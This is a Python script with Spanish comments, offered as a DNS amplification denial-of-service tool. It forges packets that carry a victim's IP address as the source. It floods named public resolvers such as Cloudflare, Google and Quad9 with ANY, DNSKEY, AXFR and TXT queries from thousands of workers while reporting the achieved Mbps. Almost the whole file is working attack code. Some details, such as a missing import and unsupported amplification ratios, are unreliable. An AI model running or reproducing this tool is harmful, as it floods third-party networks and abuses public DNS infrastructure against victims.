#!/usr/bin/env python3
"""
DNS Amplifier Extreme - Máximo rendimiento Mbps
Técnicas: Multi-vector, Socket RAW, Thread pooling, Connection reuse
"""
import socket
import struct
import threading
import time
import sys
import random
import argparse
import ipaddress
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import multiprocessing
import ctypes
from scapy.all import IP, UDP, DNS, DNSQR, raw
import psutil
import os

# ================= CONFIGURACIÓN MÁXIMO RENDIMIENTO =================
class TurboConfig:
    # Ajustes para máximo throughput
    MAX_THREADS = 2000  # Threads concurrentes
    SOCKET_BUFFER = 65535  # Buffer máximo socket
    PACKETS_PER_BATCH = 1000  # Paquetes por batch
    USE_RAW_SOCKETS = True  # Sockets RAW para mayor velocidad
    REUSE_PORT = True  # Reutilizar puertos SO_REUSEPORT
    
    # Vectores de amplificación óptimos (ratio respuesta/solicitud)
    AMP_VECTORS = [
        ('ANY', 75.9),      # Cloudflare ANY query
        ('DNSKEY', 58.4),   # DNSSEC keys
        ('AXFR', 142.7),    # Zone transfer (mejor ratio)
        ('NS', 41.3),       # Name server records
        ('TXT', 50.2),      # Text records (grandes)
        ('SOA', 30.5),      # Start of Authority
    ]
    
    # Reflectores DNS públicos con alto ratio
    DNS_REFLECTORS = [
        # Cloudflare (1.1.1.1/1.0.0.1) - Alto throughput
        "1.1.1.1", "1.0.0.1",
        # Google DNS
        "8.8.8.8", "8.8.4.4",
        # OpenDNS
        "208.67.222.222", "208.67.220.220",
        # Quad9
        "9.9.9.9", "149.112.112.112",
        # DNS.WATCH
        "84.200.69.80", "84.200.70.40",
    ]

# ================= SOCKET TURBO =================
class RawSocketTurbo:
    """Sockets RAW para máximo rendimiento - bypass kernel overhead"""
    
    def __init__(self):
        self.sockets = []
        self.init_raw_sockets()
    
    def init_raw_sockets(self):
        """Inicializa múltiples sockets RAW"""
        for i in range(50):  # 50 sockets en pool
            try:
                # Socket RAW - máximo control
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 33554432)  # 32MB buffer
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                if hasattr(socket, 'SO_REUSEPORT'):
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                self.sockets.append(s)
            except:
                # Fallback a socket UDP normal
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 33554432)
                self.sockets.append(s)
    
    def craft_dns_amplification_packet(self, target_ip: str, reflector: str, amp_type: str):
        """Crea paquete DNS optimizado para máxima amplificación"""
        
        # IP Header
        ip_version = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 0  # kernel calculará
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0
        ip_saddr = socket.inet_aton(target_ip)  # IP spoofed del target
        ip_daddr = socket.inet_aton(reflector)
        
        ip_ihl_ver = (ip_version << 4) + ip_ihl
        
        # IP Header sin checksum
        ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ihl_ver,
            ip_tos,
            ip_tot_len,
            ip_id,
            ip_frag_off,
            ip_ttl,
            ip_proto,
            ip_check,
            ip_saddr,
            ip_daddr
        )
        
        # UDP Header
        src_port = random.randint(1024, 65535)
        dst_port = 53
        udp_length = 0  # Se calculará
        udp_checksum = 0
        
        # DNS Query (solicitud pequeña)
        # Transaction ID
        trans_id = random.randint(1, 65535)
        
        # DNS Flags (standard query)
        flags = 0x0100  # Recursion desired
        
        # Questions count
        questions = 1
        
        # Construir query según tipo
        domain = "isc.org"  # Dominio conocido con respuestas grandes
        
        if amp_type == "ANY":
            qtype = 255  # TYPE ANY
        elif amp_type == "DNSKEY":
            qtype = 48   # DNSKEY
        elif amp_type == "AXFR":
            qtype = 252  # AXFR
        elif amp_type == "TXT":
            qtype = 16   # TXT
        else:
            qtype = 1    # A record
        
        qclass = 1  # IN class
        
        # Nombre codificado
        name_parts = domain.split('.')
        encoded_name = b''
        for part in name_parts:
            encoded_name += struct.pack('B', len(part)) + part.encode()
        encoded_name += b'\x00'
        
        # DNS Query completa
        dns_query = struct.pack('!HHHHHH',
            trans_id,
            flags,
            questions,
            0, 0, 0  # Answer, Authority, Additional counts = 0
        ) + encoded_name + struct.pack('!HH', qtype, qclass)
        
        # Calcular longitud UDP
        udp_length = 8 + len(dns_query)
        
        # UDP Header completo
        udp_header = struct.pack('!HHHH',
            src_port,
            dst_port,
            udp_length,
            udp_checksum
        )
        
        # Paquete completo
        packet = ip_header + udp_header + dns_query
        
        return packet, len(packet)

# ================= THREAD TURBO =================
class DNSAmplifierTurbo:
    """Amplificador DNS con técnicas extremas para máximo Mbps"""
    
    def __init__(self, target: str, duration: int):
        self.target = target
        self.duration = duration
        self.packets_sent = multiprocessing.Value('L', 0)
        self.bytes_sent = multiprocessing.Value('L', 0)
        self.running = multiprocessing.Value('b', True)
        self.raw_socket = RawSocketTurbo()
        
        # Estadísticas
        self.start_time = time.time()
        self.peak_mbps = 0
        
    def attack_worker(self, worker_id: int):
        """Worker de ataque optimizado - máx throughput"""
        reflector = random.choice(TurboConfig.DNS_REFLECTORS)
        amp_type, ratio = random.choice(TurboConfig.AMP_VECTORS)
        
        # Crear socket individual por worker
        if TurboConfig.USE_RAW_SOCKETS:
            sock = self.raw_socket.sockets[worker_id % len(self.raw_socket.sockets)]
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 33554432)
        
        packet_count = 0
        byte_count = 0
        
        # Bucle principal optimizado
        while self.running.value and time.time() - self.start_time < self.duration:
            try:
                # Enviar batch de paquetes (menos overhead de llamadas)
                for _ in range(TurboConfig.PACKETS_PER_BATCH):
                    if TurboConfig.USE_RAW_SOCKETS:
                        packet, pkt_size = self.raw_socket.craft_dns_amplification_packet(
                            self.target, reflector, amp_type
                        )
                        # Enviar directamente al reflector
                        sock.sendto(packet, (reflector, 0))
                    else:
                        # Método UDP normal
                        query = self.create_dns_query(amp_type)
                        sock.sendto(query, (reflector, 53))
                        pkt_size = len(query)
                    
                    packet_count += 1
                    byte_count += pkt_size
                    
                    # Cambiar reflector periódicamente
                    if packet_count % 100 == 0:
                        reflector = random.choice(TurboConfig.DNS_REFLECTORS)
                        amp_type, ratio = random.choice(TurboConfig.AMP_VECTORS)
                
                # Actualizar contadores compartidos
                with self.packets_sent.get_lock():
                    self.packets_sent.value += packet_count
                    self.bytes_sent.value += byte_count
                
                packet_count = 0
                byte_count = 0
                
            except Exception as e:
                # Recuperación rápida de errores
                continue
        
        sock.close()
    
    def create_dns_query(self, qtype: str) -> bytes:
        """Crea consulta DNS optimizada"""
        # IDs de tipo DNS
        type_map = {
            'ANY': 255,
            'DNSKEY': 48,
            'AXFR': 252,
            'TXT': 16,
            'NS': 2,
            'SOA': 6
        }
        
        # Header DNS
        trans_id = random.randint(1, 65535)
        flags = 0x0100  # Standard query, RD
        questions = 1
        
        header = struct.pack('!HHHHHH',
            trans_id,
            flags,
            questions,
            0, 0, 0
        )
        
        # Query: isc.org (respuestas grandes conocidas)
        domain = b'\x03isc\x03org\x00'
        qtype_val = type_map.get(qtype, 255)
        qclass = 1  # IN
        
        query = struct.pack('!HH', qtype_val, qclass)
        
        return header + domain + query
    
    def stats_monitor(self):
        """Monitor de estadísticas en tiempo real"""
        last_packets = 0
        last_bytes = 0
        last_time = time.time()
        
        while self.running.value:
            time.sleep(1)
            
            current_time = time.time()
            elapsed = current_time - last_time
            
            with self.packets_sent.get_lock():
                packets = self.packets_sent.value
                bytes_sent = self.bytes_sent.value
            
            # Calcular Mbps
            new_bytes = bytes_sent - last_bytes
            mbps = (new_bytes * 8) / (elapsed * 1_000_000)
            
            # Actualizar peak
            if mbps > self.peak_mbps:
                self.peak_mbps = mbps
            
            # Estadísticas
            print(f"\r[STATS] Packets: {packets:,} | "
                  f"MB sent: {bytes_sent / 1_000_000:.2f} | "
                  f"Current: {mbps:.2f} Mbps | "
                  f"Peak: {self.peak_mbps:.2f} Mbps | "
                  f"Time: {int(current_time - self.start_time)}/{self.duration}s", 
                  end='', flush=True)
            
            last_packets = packets
            last_bytes = bytes_sent
            last_time = current_time
    
    def launch_attack(self):
        """Lanza ataque con máximo rendimiento"""
        print(f"[+] Target: {self.target}")
        print(f"[+] Duration: {self.duration}s")
        print(f"[+] Threads: {TurboConfig.MAX_THREADS}")
        print(f"[+] Amplification vectors: {len(TurboConfig.AMP_VECTORS)}")
        print(f"[+] DNS Reflectors: {len(TurboConfig.DNS_REFLECTORS)}")
        print(f"[+] Raw Sockets: {TurboConfig.USE_RAW_SOCKETS}")
        print("[+] Starting attack...\n")
        
        # Iniciar monitor
        monitor_thread = threading.Thread(target=self.stats_monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Pool de procesos (mejor para CPU multi-core)
        with ProcessPoolExecutor(max_workers=multiprocessing.cpu_count() * 2) as executor:
            futures = []
            for i in range(TurboConfig.MAX_THREADS):
                future = executor.submit(self.attack_worker, i)
                futures.append(future)
            
            # Esperar finalización
            try:
                for future in as_completed(futures):
                    future.result(timeout=self.duration + 5)
            except:
                pass
        
        # Finalización
        self.running.value = False
        print(f"\n\n[+] Attack completed!")
        print(f"[+] Total packets: {self.packets_sent.value:,}")
        print(f"[+] Total data: {self.bytes_sent.value / 1_000_000:.2f} MB")
        print(f"[+] Peak bandwidth: {self.peak_mbps:.2f} Mbps")
        print(f"[+] Average: {(self.bytes_sent.value * 8) / (self.duration * 1_000_000):.2f} Mbps")

# ================= OPTIMIZACIONES ADICIONALES =================
def optimize_system():
    """Aplica optimizaciones de sistema para máximo rendimiento"""
    print("[*] Applying system optimizations...")
    
    try:
        # Aumentar límites de sistema
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (999999, 999999))
    except:
        pass
    
    try:
        # Prioridad alta
        os.nice(-20)
    except:
        pass
    
    # Configurar CPU affinity
    try:
        import psutil
        p = psutil.Process()
        p.cpu_affinity(list(range(multiprocessing.cpu_count())))
    except:
        pass
    
    # Desactivar buffering de salida
    sys.stdout.reconfigure(line_buffering=True)

# ================= MAIN =================
def main():
    parser = argparse.ArgumentParser(description="DNS Amplifier Turbo - Max Mbps")
    parser.add_argument("host", help="Target IP address")
    parser.add_argument("port", type=int, help="Target port (unused in DNS amp)")
    parser.add_argument("time", type=int, help="Attack duration in seconds")
    
    args = parser.parse_args()
    
    # Validaciones
    try:
        ipaddress.ip_address(args.host)
    except ValueError:
        print(f"[-] Invalid IP address: {args.host}")
        sys.exit(1)
    
    if args.time < 1 or args.time > 3600:
        print("[-] Time must be between 1 and 3600 seconds")
        sys.exit(1)
    
    # Aplicar optimizaciones
    optimize_system()
    
    # Lanzar ataque
    amplifier = DNSAmplifierTurbo(args.host, args.time)
    
    try:
        amplifier.launch_attack()
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user")
        amplifier.running.value = False
    except Exception as e:
        print(f"\n[-] Error: {e}")
        amplifier.running.value = False

if __name__ == "__main__":
    # Verificar permisos
    if os.geteuid() != 0 and TurboConfig.USE_RAW_SOCKETS:
        print("[!] Warning: Raw sockets require root privileges")
        print("[!] Falling back to normal sockets")
        TurboConfig.USE_RAW_SOCKETS = False
    
    main()
